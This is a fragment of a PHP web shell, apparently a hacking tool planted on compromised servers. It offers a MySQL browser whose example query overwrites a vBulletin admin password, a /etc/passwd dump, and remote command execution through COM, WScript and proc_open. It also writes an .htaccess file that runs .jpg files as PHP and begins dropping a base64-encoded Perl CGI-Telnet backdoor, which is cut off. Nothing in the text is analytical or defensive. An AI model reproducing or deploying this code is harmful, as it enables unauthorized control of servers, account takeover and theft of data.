    p('<p>');
    p('DBHost:');
    makeinput(array(
        'name' => 'dbhost',
        'size' => 20,
        'value' => $dbhost
    ));
    p(':');
    makeinput(array(
        'name' => 'dbport',
        'size' => 4,
        'value' => $dbport
    ));
    p('DBUser:');
    makeinput(array(
        'name' => 'dbuser',
        'size' => 15,
        'value' => $dbuser
    ));
    p('DBPass:');
    makeinput(array(
        'name' => 'dbpass',
        'size' => 15,
        'value' => $dbpass
    ));
    p('DBCharset:');
    makeselect(array(
        'name' => 'charset',
        'option' => $charsets,
        'selected' => $charset
    ));
    makeinput(array(
        'name' => 'connect',
        'value' => 'Connect',
        'type' => 'submit',
        'class' => 'bt'
    ));
    p('</p>');
    formfoot();
?><script type="text/javascript">
function editrecord(action, base64, tablename){
	if (action == 'del') {
		if (!confirm('Is or isn\'t deletion record?')) return;
	}
	$('recordlist').doing.value=action;
	$('recordlist').base64.value=base64;
	$('recordlist').tablename.value=tablename;
	$('recordlist').submit();
}
function moddbname(dbname) {
	if(!dbname) return;
	$('setdbname').dbname.value=dbname;
	$('setdbname').submit();
}
function settable(tablename,doing,page) {
	if(!tablename) return;
	if (doing) {
		$('settable').doing.value=doing;
	}
	if (page) {
		$('settable').page.value=page;
	}
	$('settable').tablename.value=tablename;
	$('settable').submit();
}
</script>
<?php
    formhead(array(
        'name' => 'recordlist'
    ));
    makehide('doing');
    makehide('action', 'sqladmin');
    makehide('base64');
    makehide('tablename');
    p($dbform);
    formfoot();
    formhead(array(
        'name' => 'setdbname'
    ));
    makehide('action', 'sqladmin');
    p($dbform);
    if (!$dbname) {
        makehide('dbname');
    }
    formfoot();
    formhead(array(
        'name' => 'settable'
    ));
    makehide('action', 'sqladmin');
    p($dbform);
    makehide('tablename');
    makehide('page', $page);
    makehide('doing');
    formfoot();
    $cachetables = array();
    $pagenum     = 30;
    $page        = intval($page);
    if ($page) {
        $start_limit = ($page - 1) * $pagenum;
    } else {
        $start_limit = 0;
        $page        = 1;
    }
    if (isset($dbhost) && isset($dbuser) && isset($dbpass) && isset($connect)) {
        dbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
        // get mysql server
        $mysqlver = mysql_get_server_info();
        p('<p>MySQL ' . $mysqlver . ' running in ' . $dbhost . ' as ' . $dbuser . '@' . $dbhost . '</p>');
        $highver = $mysqlver > '4.1' ? 1 : 0;
        
        // Show database
        $query = q("SHOW DATABASES");
        $dbs   = array();
        $dbs[] = '-- Select a database --';
        while ($db = mysql_fetch_array($query)) {
            $dbs[$db['Database']] = $db['Database'];
        }
        makeselect(array(
            'title' => 'Please select a database:',
            'name' => 'db[]',
            'option' => $dbs,
            'selected' => $dbname,
            'onchange' => 'moddbname(this.options[this.selectedIndex].value)',
            'newline' => 1
        ));
        $tabledb = array();
        if ($dbname) {
            p('<p>');
            p('Current dababase: <a href="javascript:moddbname(\'' . $dbname . '\');">' . $dbname . '</a>');
            if ($tablename) {
                p(' | Current Table: <a href="javascript:settable(\'' . $tablename . '\');">' . $tablename . '</a> [ <a href="javascript:settable(\'' . $tablename . '\', \'insert\');">Insert</a> | <a href="javascript:settable(\'' . $tablename . '\', \'structure\');">Structure</a> | <a href="javascript:settable(\'' . $tablename . '\', \'drop\');">Drop</a> ]');
            }
            p('</p>');
            mysql_select_db($dbname);
            
            $getnumsql = '';
            $runquery  = 0;
            if ($sql_query) {
                $runquery = 1;
            }
            $allowedit = 0;
            if ($tablename && !$sql_query) {
                $sql_query = "SELECT * FROM $tablename";
                $getnumsql = $sql_query;
                $sql_query = $sql_query . " LIMIT $start_limit, $pagenum";
                $allowedit = 1;
            }
            p('<form action="' . $self . '" method="POST">');
            p('<p><table width="200" border="0" cellpadding="0" cellspacing="0"><tr><td colspan="2">Run SQL query/queries on database <font color=red><b>' . $dbname . '</font></b>:<BR>Example VBB Password: <font color=red>KyoBin</font><BR><font color=yellow>UPDATE `user` SET `password` = \'69e53e5ab9536e55d31ff533aefc4fbe\', salt = \'p5T\' WHERE `userid` = \'1\' </font>
			</td></tr><tr><td><textarea name="sql_query" class="area" style="width:600px;height:50px;overflow:auto;">' . htmlspecialchars($sql_query, ENT_QUOTES) . '</textarea></td><td style="padding:0 5px;"><input class="bt" style="height:50px;" name="submit" type="submit" value="Query" /></td></tr></table></p>');
            makehide('tablename', $tablename);
            makehide('action', 'sqladmin');
            p($dbform);
            p('</form>');
            if ($tablename || ($runquery && $sql_query)) {
                if ($doing == 'structure') {
                    $result = q("SHOW COLUMNS FROM $tablename");
                    $rowdb  = array();
                    while ($row = mysql_fetch_array($result)) {
                        $rowdb[] = $row;
                    }
                    p('<table border="0" cellpadding="3" cellspacing="0">');
                    p('<tr class="head">');
                    p('<td>Field</td>');
                    p('<td>Type</td>');
                    p('<td>Null</td>');
                    p('<td>Key</td>');
                    p('<td>Default</td>');
                    p('<td>Extra</td>');
                    p('</tr>');
                    foreach ($rowdb as $row) {
                        $thisbg = bg();
                        p('<tr class="fout" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'fout\';">');
                        p('<td>' . $row['Field'] . '</td>');
                        p('<td>' . $row['Type'] . '</td>');
                        p('<td>' . $row['Null'] . '&nbsp;</td>');
                        p('<td>' . $row['Key'] . '&nbsp;</td>');
                        p('<td>' . $row['Default'] . '&nbsp;</td>');
                        p('<td>' . $row['Extra'] . '&nbsp;</td>');
                        p('</tr>');
                    }
                    tbfoot();
                } elseif ($doing == 'insert' || $doing == 'edit') {
                    $result = q('SHOW COLUMNS FROM ' . $tablename);
                    while ($row = mysql_fetch_array($result)) {
                        $rowdb[] = $row;
                    }
                    $rs = array();
                    if ($doing == 'insert') {
                        p('<h2>Insert new line in ' . $tablename . ' table &raquo;</h2>');
                    } else {
                        p('<h2>Update record in ' . $tablename . ' table &raquo;</h2>');
                        $where  = base64_decode($base64);
                        $result = q("SELECT * FROM $tablename WHERE $where LIMIT 1");
                        $rs     = mysql_fetch_array($result);
                    }
                    p('<form method="post" action="' . $self . '">');
                    p($dbform);
                    makehide('action', 'sqladmin');
                    makehide('tablename', $tablename);
                    p('<table border="0" cellpadding="3" cellspacing="0">');
                    foreach ($rowdb as $row) {
                        if ($rs[$row['Field']]) {
                            $value = htmlspecialchars($rs[$row['Field']]);
                        } else {
                            $value = '';
                        }
                        $thisbg = bg();
                        p('<tr class="fout" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'fout\';">');
                        p('<td><b>' . $row['Field'] . '</b><br />' . $row['Type'] . '</td><td><textarea class="area" name="insertsql[' . $row['Field'] . ']" style="width:500px;height:60px;overflow:auto;">' . $value . '</textarea></td></tr>');
                    }
                    if ($doing == 'insert') {
                        p('<tr class="fout"><td colspan="2"><input class="bt" type="submit" name="insert" value="Insert" /></td></tr>');
                    } else {
                        p('<tr class="fout"><td colspan="2"><input class="bt" type="submit" name="update" value="Update" /></td></tr>');
                        makehide('base64', $base64);
                    }
                    p('</table></form>');
                } else {
                    $querys = @explode(';', $sql_query);
                    foreach ($querys as $num => $query) {
                        if ($query) {
                            p("<p><b>Query#{$num} : " . htmlspecialchars($query, ENT_QUOTES) . "</b></p>");
                            switch (qy($query)) {
                                case 0:
                                    p('<h2>Error : ' . mysql_error() . '</h2>');
                                    break;
                                case 1:
                                    if (strtolower(substr($query, 0, 13)) == 'select * from') {
                                        $allowedit = 1;
                                    }
                                    if ($getnumsql) {
                                        $tatol     = mysql_num_rows(q($getnumsql));
                                        $multipage = multi($tatol, $pagenum, $page, $tablename);
                                    }
                                    if (!$tablename) {
                                        $sql_line = str_replace(array(
                                            "\r",
                                            "\n",
                                            "\t"
                                        ), array(
                                            ' ',
                                            ' ',
                                            ' '
                                        ), trim(htmlspecialchars($query)));
                                        $sql_line = preg_replace("/\/\*[^(\*\/)]*\*\//i", " ", $sql_line);
                                        preg_match_all("/from\s+`{0,1}([\w]+)`{0,1}\s+/i", $sql_line, $matches);
                                        $tablename = $matches[1][0];
                                    }
                                    $result = q($query);
                                    p($multipage);
                                    p('<table border="0" cellpadding="3" cellspacing="0">');
                                    p('<tr class="head">');
                                    if ($allowedit)
                                        p('<td>Action</td>');
                                    $fieldnum = @mysql_num_fields($result);
                                    for ($i = 0; $i < $fieldnum; $i++) {
                                        $name = @mysql_field_name($result, $i);
                                        $type = @mysql_field_type($result, $i);
                                        $len  = @mysql_field_len($result, $i);
                                        p("<td nowrap>$name<br><span>$type($len)</span></td>");
                                    }
                                    p('</tr>');
                                    while ($mn = @mysql_fetch_assoc($result)) {
                                        $thisbg = bg();
                                        p('<tr class="fout" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'fout\';">');
                                        $where = $tmp = $b1 = '';
                                        foreach ($mn as $key => $inside) {
                                            if ($inside) {
                                                $where .= $tmp . $key . "='" . addslashes($inside) . "'";
                                                $tmp = ' AND ';
                                            }
                                            $b1 .= '<td nowrap>' . html_clean($inside) . '&nbsp;</td>';
                                        }
                                        $where = base64_encode($where);
                                        if ($allowedit)
                                            p('<td nowrap><a href="javascript:editrecord(\'edit\', \'' . $where . '\', \'' . $tablename . '\');">Edit</a> | <a href="javascript:editrecord(\'del\', \'' . $where . '\', \'' . $tablename . '\');">Del</a></td>');
                                        p($b1);
                                        p('</tr>');
                                        unset($b1);
                                    }
                                    tbfoot();
                                    p($multipage);
                                    break;
                                case 2:
                                    $ar = mysql_affected_rows();
                                    p('<h2>affected rows : <b>' . $ar . '</b></h2>');
                                    break;
                            }
                        }
                    }
                }
            } else {
                $query     = q("SHOW TABLE STATUS");
                $table_num = $table_rows = $data_size = 0;
                $tabledb   = array();
                while ($table = mysql_fetch_array($query)) {
                    $data_size            = $data_size + $table['Data_length'];
                    $table_rows           = $table_rows + $table['Rows'];
                    $table['Data_length'] = sizecount($table['Data_length']);
                    $table_num++;
                    $tabledb[] = $table;
                }
                $data_size = sizecount($data_size);
                unset($table);
                p('<table border="0" cellpadding="0" cellspacing="0">');
                p('<form action="' . $self . '" method="POST">');
                makehide('action', 'sqladmin');
                p($dbform);
                p('<tr class="head">');
                p('<td width="2%" align="center"><input name="chkall" value="on" type="checkbox" onclick="CheckAll(this.form)" /></td>');
                p('<td>Name</td>');
                p('<td>Rows</td>');
                p('<td>Data_length</td>');
                p('<td>Create_time</td>');
                p('<td>Update_time</td>');
                if ($highver) {
                    p('<td>Engine</td>');
                    p('<td>Collation</td>');
                }
                p('</tr>');
                foreach ($tabledb as $key => $table) {
                    $thisbg = bg();
                    p('<tr class="fout" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'fout\';">');
                    p('<td align="center" width="2%"><input type="checkbox" name="table[]" value="' . $table['Name'] . '" /></td>');
                    p('<td><a href="javascript:settable(\'' . $table['Name'] . '\');">' . $table['Name'] . '</a> [ <a href="javascript:settable(\'' . $table['Name'] . '\', \'insert\');">Insert</a> | <a href="javascript:settable(\'' . $table['Name'] . '\', \'structure\');">Structure</a> | <a href="javascript:settable(\'' . $table['Name'] . '\', \'drop\');">Drop</a> ]</td>');
                    p('<td>' . $table['Rows'] . '</td>');
                    p('<td>' . $table['Data_length'] . '</td>');
                    p('<td>' . $table['Create_time'] . '</td>');
                    p('<td>' . $table['Update_time'] . '</td>');
                    if ($highver) {
                        p('<td>' . $table['Engine'] . '</td>');
                        p('<td>' . $table['Collation'] . '</td>');
                    }
                    p('</tr>');
                }
                p('<tr class=fout>');
                p('<td>&nbsp;</td>');
                p('<td>Total tables: ' . $table_num . '</td>');
                p('<td>' . $table_rows . '</td>');
                p('<td>' . $data_size . '</td>');
                p('<td colspan="' . ($highver ? 4 : 2) . '">&nbsp;</td>');
                p('</tr>');
                
                p("<tr class=\"fout\"><td colspan=\"" . ($highver ? 8 : 6) . "\"><input name=\"saveasfile\" value=\"1\" type=\"checkbox\" /> Save as file <input class=\"input\" name=\"path\" value=\"" . SA_ROOT . $_SERVER['HTTP_HOST'] . "_MySQL.sql\" type=\"text\" size=\"60\" /> <input class=\"bt\" type=\"submit\" name=\"downrar\" value=\"Export selection table\" /></td></tr>");
                makehide('doing', 'backupmysql');
                formfoot();
                p("</table>");
                fr($query);
            }
        }
    }
    tbfoot();
    @mysql_close();
} elseif ($action == 'etcpwd') {
    formhead(array(
        'title' => 'Get /etc/passwd'
    ));
    makehide('action', 'etcpwd');
    makehide('dir', $nowpath);
    $i = 0;
    echo "<p><br><textarea class=\area\ id=\phpcodexxx\ name=\phpcodexxx\ cols=\100\ rows=\25\>";
    while ($i < 60000) {
        $line = posix_getpwuid($i);
        if (!empty($line)) {
            while (list($key, $vba_etcpwd) = each($line)) {
                echo "" . $vba_etcpwd . "
";
                break;
            }
        }
        $i++;
    }
    echo "</textarea></p>";
    formfoot();
} elseif ($action == 'command') {
    if (IS_WIN && IS_COM) {
        if ($program && $parameter) {
            $shell = new COM('Shell.Application');
            $a     = $shell->ShellExecute($program, $parameter);
            m('Program run has ' . (!$a ? 'success' : 'fail'));
        }
        !$program && $program = 'c:\indows\ystem32\md.exe';
        !$parameter && $parameter = '/c net start > ' . SA_ROOT . 'log.txt';
        formhead(array(
            'title' => 'Execute Program'
        ));
        makehide('action', 'shell');
        makeinput(array(
            'title' => 'Program',
            'name' => 'program',
            'value' => $program,
            'newline' => 1
        ));
        p('<p>');
        makeinput(array(
            'title' => 'Parameter',
            'name' => 'parameter',
            'value' => $parameter
        ));
        makeinput(array(
            'name' => 'submit',
            'class' => 'bt',
            'type' => 'submit',
            'value' => 'Execute'
        ));
        p('</p>');
        formfoot();
    }
    formhead(array(
        'title' => 'Execute Command'
    ));
    makehide('action', 'shell');
    if (IS_WIN && IS_COM) {
        $execfuncdb = array(
            'phpfunc' => 'phpfunc',
            'wscript' => 'wscript',
            'proc_open' => 'proc_open'
        );
        makeselect(array(
            'title' => 'Use:',
            'name' => 'execfunc',
            'option' => $execfuncdb,
            'selected' => $execfunc,
            'newline' => 1
        ));
    }
    p('<p>');
    makeinput(array(
        'title' => 'Command',
        'name' => 'command',
        'value' => $command
    ));
    makeinput(array(
        'name' => 'submit',
        'class' => 'bt',
        'type' => 'submit',
        'value' => 'Execute'
    ));
    p('</p>');
    formfoot();
    if ($command) {
        p('<hr width="100%" noshade /><pre>');
        if ($execfunc == 'wscript' && IS_WIN && IS_COM) {
            $wsh       = new COM('WScript.shell');
            $exec      = $wsh->exec('cmd.exe /c ' . $command);
            $stdout    = $exec->StdOut();
            $stroutput = $stdout->ReadAll();
            echo $stroutput;
        } elseif ($execfunc == 'proc_open' && IS_WIN && IS_COM) {
            $descriptorspec = array(
                0 => array(
                    'pipe',
                    'r'
                ),
                1 => array(
                    'pipe',
                    'w'
                ),
                2 => array(
                    'pipe',
                    'w'
                )
            );
            $process        = proc_open($_SERVER['COMSPEC'], $descriptorspec, $pipes);
            if (is_resource($process)) {
                fwrite($pipes[0], $command . "
");
                fwrite($pipes[0], "exit
");
                fclose($pipes[0]);
                while (!feof($pipes[1])) {
                    echo fgets($pipes[1], 1024);
                }
                fclose($pipes[1]);
                while (!feof($pipes[2])) {
                    echo fgets($pipes[2], 1024);
                }
                fclose($pipes[2]);
                proc_close($process);
            }
        } else {
            echo (execute($command));
        }
        p('</pre>');
    }
} elseif ($action == 'error.log') {
    mkdir('error', 0755);
    chdir('error');
    $kokdosya  = ".htaccess";
    $dosya_adi = "$kokdosya";
    $dosya = fopen($dosya_adi, 'w') or die("Can not open file!");
    $metin = "Options +FollowSymLinks +Indexes
DirectoryIndex default.html 
## START ##
Options +ExecCGI
AddHandler cgi-script log cgi pl tg love h4 tgb x-zone 
AddType application/x-httpd-php .jpg
RewriteEngine on
RewriteRule (.*)\war$ .log
## END ##";
    fwrite($dosya, $metin);
    fclose($dosya);
    $pythonp = 'IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWluCnVzZSBNSU1FOjpCYXNlNjQ7CiRWZXJzaW9uPSAiQ0dJLVRlbG5ldCBWZXJzaW9uIDEuNSI7CiRFZGl0UGVyc2lvbj0iPGZvbnQgc3R5bGU9J3RleHQtc2hhZG93OiAwcHggMHB4IDZweCByZ2IoMjU1LCAwLCAwKSwgMHB4IDBweCA1cHggcmdiKDI1NSwgMCwgMCksIDBweCAwcHggNXB4IHJnYigyNTUsIDAsIDApOyBjb2xvcjojZmZmZmZmOyBmb250LXdlaWdodDpib2xkOyc+S3ltIExqbms8L2ZvbnQ+IjsKCiRQYXNzd29yZCA9ICJ4eHgiOwkJCSMgQ2hhbmdlIHRoaXMuIFlvdSB3aWxsIG5lZWQgdG8gZW50ZXIgdGhpcwoJCQkJIyB0byBsb2dpbi4Kc3ViIElzX1dpbigpewoJJG9zID0gJnRyaW0oJEVOVnsiU0VSVkVSX1NPRlRXQVJFIn0pOwoJaWYoJG9zID1+IG0vd2luL2kpewoJCXJldHVybiAxOwoJfWVsc2V7CgkJcmV0dXJuIDA7Cgl9Cn0KJFdpbk5UID0gJklzX1dpbigpOwkJCSMgWW91IG5lZWQgdG8gY2hhbmdlIHRoZSB2YWx1ZSBvZiB0aGlzIHRvIDEgaWYKCQkJCQkjIHlvdSdyZSBydW5uaW5nIHRoaXMgc2NyaXB0IG9uIGEgV2luZG93cyBOVAoJCQkJCSMgbWFjaGluZS4gSWYgeW91J3JlIHJ1bm5pbmcgaXQgb24gVW5peCwgeW91CgkJCQkJIyBjYW4gbGVhdmUgdGhlIHZhbHVlIGFzIGl0IGlzLgoKJE5UQ21kU2VwID0gIiYiOwkJCSMgVGhpcyBjaGFyYWN0ZXIgaXMgdXNlZCB0byBzZXBlcmF0ZSAyIGNvbW1hbmRzCgkJCQkJIyBpbiBhIGNvbW1hbmQgbGluZSBvbiBXaW5kb3dzIE5ULgoKJFVuaXhDbWRTZXAgPSAiOyI7CQkJIyBUaGlzIGNoYXJhY3RlciBpcyB1c2VkIHRvIHNlcGVyYXRlIDIgY29tbWFuZHMKCQkJCQkjIGluIGEgY29tbWFuZCBsaW5lIG9uIFVuaXguCgokQ29tbWFuZFRpbWVvdXREdXJhdGlvbiA9IDEwOwkJIyBUaW1lIGluIHNlY29uZHMgYWZ0ZXIgY29tbWFuZHMgd2lsbCBiZSBraWxsZWQKCQkJCQkjIERvbid0IHNldCB0aGlzIHRvIGEgdmVyeSBsYXJnZSB2YWx1ZS4gVGhpcyBpcwoJCQkJCSMgdXNlZnVsIGZvciBjb21tYW5kcyB0aGF0IG1heSBoYW5nIG9yIHRoYXQKCQkJCQkjIHRha2UgdmVyeSBsb25nIHRvIGV4ZWN1dGUsIGxpa2UgImZpbmQgLyIuCgkJCQkJIyBUaGlzIGlzIHZhbGlkIG9ubHkgb24gVW5peCBzZXJ2ZXJzLiBJdCBpcwoJCQkJCSMgaWdub3JlZCBvbiBOVCBTZXJ2ZXJzLgoKJFNob3dEeW5hbWljT3V0cHV0ID0gMTsJCQkjIElmIHRoaXMgaXMgMSwgdGhlbiBkYXRhIGlzIHNlbnQgdG8gdGhlCgkJCQkJIyBicm93c2VyIGFzIHNvb24gYXMgaXQgaXMgb3V0cHV0LCBvdGhlcndpc2UKCQkJCQkjIGl0IGlzIGJ1ZmZlcmVkIGFuZCBzZW5kIHdoZW4gdGhlIGNvbW1hbmQKCQkJCQkjIGNvbXBsZXRlcy4gVGhpcyBpcyB1c2VmdWwgZm9yIGNvbW1hbmRzIGxpa2UKCQkJCQkjIHBpbmcsIHNvIHRoYXQgeW91IGNhbiBzZWUgdGhlIG91dHB1dCBhcyBpdAoJCQkJCSMgaXMgYmVpbmcgZ2VuZXJhdGVkLgoKIyBET04nVCBDSEFOR0UgQU5ZVEhJTkcgQkVMT1cgVEhJUyBMSU5FIFVOTEVTUyBZT1UgS05PVyBXSEFUIFlPVSdSRSBET0lORyAhIQoKJENtZFNlcCA9ICgkV2luTlQgPyAkTlRDbWRTZXAgOiAkVW5peENtZFNlcCk7CiRDbWRQd2QgPSAoJFdpbk5UID8gImNkIiA6ICJwd2QiKTsKJFBhdGhTZXAgPSAoJFdpbk5UID8gIlxcIiA6ICIvIik7CiRSZWRpcmVjdG9yID0gKCRXaW5OVCA/ICIgMj4mMSAxPiYyIiA6ICIgMT4mMSAyPiYxIik7CiRjb2xzPSAxMzA7CiRyb3dzPSAyNjsKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFJlYWRzIHRoZSBpbnB1dCBzZW50IGJ5IHRoZSBicm93c2VyIGFuZCBwYXJzZXMgdGhlIGlucHV0IHZhcmlhYmxlcy4gSXQKIyBwYXJzZXMgR0VULCBQT1NUIGFuZCBtdWx0aXBhcnQvZm9ybS1kYXRhIHRoYXQgaXMgdXNlZCBmb3IgdXBsb2FkaW5nIGZpbGVzLgojIFRoZSBmaWxlbmFtZSBpcyBzdG9yZWQgaW4gJGlueydmJ30gYW5kIHRoZSBkYXRhIGlzIHN0b3JlZCBpbiAkaW57J2ZpbGVkYXRhJ30uCiMgT3RoZXIgdmFyaWFibGVzIGNhbiBiZSBhY2Nlc3NlZCB1c2luZyAkaW57J3Zhcid9LCB3aGVyZSB2YXIgaXMgdGhlIG5hbWUgb2YKIyB0aGUgdmFyaWFibGUuIE5vdGU6IE1vc3Qgb2YgdGhlIGNvZGUgaW4gdGhpcyBmdW5jdGlvbiBpcyB0YWtlbiBmcm9tIG90aGVyIENHSQojIHNjcmlwdHMuCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFJlYWRQYXJzZSAKewoJbG9jYWwgKCppbikgPSBAXyBpZiBAXzsKCWxvY2FsICgkaSwgJGxvYywgJGtleSwgJHZhbCk7CgkkTXVsdGlwYXJ0Rm9ybURhdGEgPSAkRU5WeydDT05URU5UX1RZUEUnfSA9fiAvbXVsdGlwYXJ0XC9mb3JtLWRhdGE7IGJvdW5kYXJ5PSguKykkLzsKCWlmKCRFTlZ7J1JFUVVFU1RfTUVUSE9EJ30gZXEgIkdFVCIpCgl7CgkJJGluID0gJEVOVnsnUVVFUllfU1RSSU5HJ307Cgl9CgllbHNpZigkRU5WeydSRVFVRVNUX01FVEhPRCd9IGVxICJQT1NUIikKCXsKCQliaW5tb2RlKFNURElOKSBpZiAkTXVsdGlwYXJ0Rm9ybURhdGEgJiAkV2luTlQ7CgkJcmVhZChTVERJTiwgJGluLCAkRU5WeydDT05URU5UX0xFTkdUSCd9KTsKCX0KCSMgaGFuZGxlIGZpbGUgdXBsb2FkIGRhdGEKCWlmKCRFTlZ7J0NPTlRFTlRfVFlQRSd9ID1+IC9tdWx0aXBhcnRcL2Zvcm0tZGF0YTsgYm91bmRhcnk9KC4rKSQvKQoJewoJCSRCb3VuZGFyeSA9ICctLScuJDE7ICMgcGxlYXNlIHJlZmVyIHRvIFJGQzE4NjcgCgkJQGxpc3QgPSBzcGxpdCgvJEJvdW5kYXJ5LywgJGluKTsgCgkJJEhlYWRlckJvZHkgPSAkbGlzdFsxXTsKCQkkSGVhZGVyQm9keSA9fiAvXHJcblxyXG58XG5cbi87CgkJJEhlYWRlciA9ICRgOwoJCSRCb2R5ID0gJCc7CiAJCSRCb2R5ID1+IHMvXHJcbiQvLzsgIyB0aGUgbGFzdCBcclxuIHdhcyBwdXQgaW4gYnkgTmV0c2NhcGUKCQkkaW57J2ZpbGVkYXRhJ30gPSAkQm9keTsKCQkkSGVhZGVyID1+IC9maWxlbmFtZT1cIiguKylcIi87IAoJCSRpbnsnZid9ID0gJDE7IAoJCSRpbnsnZid9ID1+IHMvXCIvL2c7CgkJJGlueydmJ30gPX4gcy9ccy8vZzsKCgkJIyBwYXJzZSB0cmFpbGVyCgkJZm9yKCRpPTI7ICRsaXN0WyRpXTsgJGkrKykKCQl7IAoJCQkkbGlzdFskaV0gPX4gcy9eLituYW1lPSQvLzsKCQkJJGxpc3RbJGldID1+IC9cIihcdyspXCIvOwoJCQkka2V5ID0gJDE7CgkJCSR2YWwgPSAkJzsKCQkJJHZhbCA9fiBzLyheKFxyXG5cclxufFxuXG4pKXwoXHJcbiR8XG4kKS8vZzsKCQkJJHZhbCA9fiBzLyUoLi4pL3BhY2soImMiLCBoZXgoJDEpKS9nZTsKCQkJJGlueyRrZXl9ID0gJHZhbDsgCgkJfQoJfQoJZWxzZSAjIHN0YW5kYXJkIHBvc3QgZGF0YSAodXJsIGVuY29kZWQsIG5vdCBtdWx0aXBhcnQpCgl7CgkJQGluID0gc3BsaXQoLyYvLCAkaW4pOwoJCWZvcmVhY2ggJGkgKDAgLi4gJCNpbikKCQl7CgkJCSRpblskaV0gPX4gcy9cKy8gL2c7CgkJCSgka2V5LCAkdmFsKSA9IHNwbGl0KC89LywgJGluWyRpXSwgMik7CgkJCSRrZXkgPX4gcy8lKC4uKS9wYWNrKCJjIiwgaGV4KCQxKSkvZ2U7CgkJCSR2YWwgPX4gcy8lKC4uKS9wYWNrKCJjIiwgaGV4KCQxKSkvZ2U7CgkJCSRpbnska2V5fSAuPSAiXDAiIGlmIChkZWZpbmVkKCRpbnska2V5fSkpOwoJCQkkaW57JGtleX0gLj0gJHZhbDsKCQl9Cgl9Cn0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIGZ1bmN0aW9uIEVuY29kZURpcjogZW5jb2RlIGJhc2U2NCBQYXRoCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIEVuY29kZURpcgp7CglteSAkZGlyID0gc2hpZnQ7CgkkZGlyID0gdHJpbShlbmNvZGVfYmFzZTY0KCRkaXIpKTsKCSRkaXIgPX4gcy8oXHJ8XG4pLy87CglyZXR1cm4gJGRpcjsKfQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgUHJpbnRzIHRoZSBIVE1MIFBhZ2UgSGVhZGVyCiMgQXJndW1lbnQgMTogRm9ybSBpdGVtIG5hbWUgdG8gd2hpY2ggZm9jdXMgc2hvdWxkIGJlIHNldAojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBQcmludFBhZ2VIZWFkZXIKewoJJEVuY29kZUN1cnJlbnREaXIgPSBFbmNvZGVEaXIoJEN1cnJlbnREaXIpOwoJbXkgJGlkID0gYGlkYCBpZighJFdpbk5UKTsKCW15ICRpbmZvID0gYHVuYW1lIC1zIC1uIC1yIC1pYDsKCXByaW50ICJDb250ZW50LXR5cGU6IHRleHQvaHRtbFxuXG4iOwoJcHJpbnQgPDxFTkQ7CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iY29udGVudC10eXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9VVRGLTgiPgo8dGl0bGU+JEVOVnsnU0VSVkVSX05BTUUnfSB8IElQIDogJEVOVnsnU0VSVkVSX0FERFInfSA8L3RpdGxlPgokSHRtbE1ldGFIZWFkZXIKPC9oZWFkPgo8c3R5bGU+CmJvZHl7CmZvbnQ6IDEwcHQgVmVyZGFuYTsKY29sb3I6ICNmZmY7Cn0KdHIsdGQsdGFibGUsaW5wdXQsdGV4dGFyZWEgewpCT1JERVItUklHSFQ6ICAjM2UzZTNlIDFweCBzb2xpZDsKQk9SREVSLVRPUDogICAgIzNlM2UzZSAxcHggc29saWQ7CkJPUkRFUi1MRUZUOiAgICMzZTNlM2UgMXB4IHNvbGlkOwpCT1JERVItQk9UVE9NOiAjM2UzZTNlIDFweCBzb2xpZDsKfQojZG9tYWluIHRyOmhvdmVyewpiYWNrZ3JvdW5kLWNvbG9yOiAjNDQ0Owp9CnRkIHsKY29sb3I6ICNmZmZmZmY7Cn0KLmxpc3RkaXIgdGR7Cgl0ZXh0LWFsaWduOiBjZW50ZXI7Cn0KLmxpc3RkaXIgdGh7Cgljb2xvcjogI0ZGOTkwMDsKfQouZGlyLC5maWxlCnsKCXRleHQtYWxpZ246IGxlZnQgIWltcG9ydGFudDsKfQouZGlyewoJZm9udC1zaXplOiAxMHB0OyAKCWZvbnQtd2VpZ2h0OiBib2xkOwp9CnRhYmxlIHsKQkFDS0dST1VORC1DT0xPUjogIzExMTsKfQppbnB1dCB7CkJBQ0tHUk9VTkQtQ09MT1I6IEJsYWNrOwpjb2xvcjogI2ZmOTkwMDsKfQppbnB1dC5zdWJtaXQgewp0ZXh0LXNoYWRvdzogMHB0IDBwdCAwLjNlbSBjeWFuLCAwcHQgMHB0IDAuM2VtIGN5YW47CmNvbG9yOiAjRkZGRkZGOwpib3JkZXItY29sb3I6ICMwMDk5MDA7Cn0KY29kZSB7CmJvcmRlcjogZGFzaGVkIDBweCAjMzMzOwpjb2xvcjogd2hpbGU7Cn0KcnVuIHsKYm9yZGVyCQkJOiBkYXNoZWQgMHB4ICMzMzM7CmNvbG9yOiAjRkYwMEFBOwp9CnRleHRhcmVhIHsKQkFDS0dST1VORC1DT0xPUjogIzFiMWIxYjsKZm9udDogRml4ZWRzeXMgYm9sZDsKY29sb3I6ICNhYWE7Cn0KQTpsaW5rIHsKCUNPTE9SOiAjZmZmZmZmOyBURVhULURFQ09SQVRJT046IG5vbmUKf